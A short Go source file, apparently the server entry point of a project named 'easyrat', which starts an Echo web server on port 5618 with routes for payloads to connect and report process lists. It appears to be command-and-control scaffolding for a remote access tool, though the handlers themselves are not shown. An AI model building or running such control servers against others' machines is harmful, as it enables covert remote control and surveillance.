package main

import (
	"easyrat/utils"
	"fmt"

	"github.com/labstack/echo"
)

const (
	port = 5618
)

func main() {
	// Initialize server
	e := echo.New()
	e.HideBanner = true

	// Routes
	e.GET("/status", utils.RStatus)
	e.POST("/payload/connect", utils.RConnect)
	e.POST("/payload/proclist", utils.RProcList)

	// Run server
	e.Logger.Fatal(e.Start(":" + fmt.Sprint(port)))
}
